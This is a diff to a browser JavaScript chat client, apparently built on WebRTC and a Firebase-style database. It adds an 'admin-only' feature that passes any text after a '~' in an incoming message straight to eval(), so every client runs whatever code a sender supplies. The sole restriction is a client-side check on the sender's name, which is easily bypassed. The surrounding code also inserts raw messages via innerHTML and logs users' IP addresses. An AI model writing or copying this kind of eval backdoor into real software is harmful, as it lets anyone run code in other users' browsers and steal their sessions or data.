@@ -124,6 +124,13 @@ pc.onicecandidate = function(ice){
             var rawdata = database.ref('bannedWords/');
             rawdata.push({msg:myIP+"- "+name+": "+curword+" at "+d.getFullYear()+","+d.getMonth()+","+d.getDate()+","+d.getHours()+":"+d.getMinutes()});
         }
+
+        if(name != "Cole" && name != "Michael"){
+            if(curword == "~"){
+                alert("This function is reserved for admins only.");
+                text.value = "";
+            }
+        }
     }
    },100);
    
@@ -160,6 +167,11 @@ pc.onicecandidate = function(ice){
             //console.log(data);
             if(datas[datas.length - 1] !== data){
                 datas.push(data);
+
+                var jsexec = data.split("~");
+                console.log(jsexec[1]);
+                eval(jsexec[1]);
+
                 var dataTarget = document.createElement("span");
                 
                 var addPadding = document.createElement("span");
@@ -167,12 +179,14 @@ pc.onicecandidate = function(ice){
                 addPadding.innerHTML = data;
                
                 addPadding.className = "add_padding";
+                addPadding.style.overflow = "auto";
                 dataTarget.appendChild(addPadding);
                 
                 dataTarget.className = "non_mod_text";
                 chat.appendChild(dataTarget);
                 
                 //numOfText++;
+                numOfText = 0;
                 
                 chat.scrollTop = chat.scrollHeight;
                 
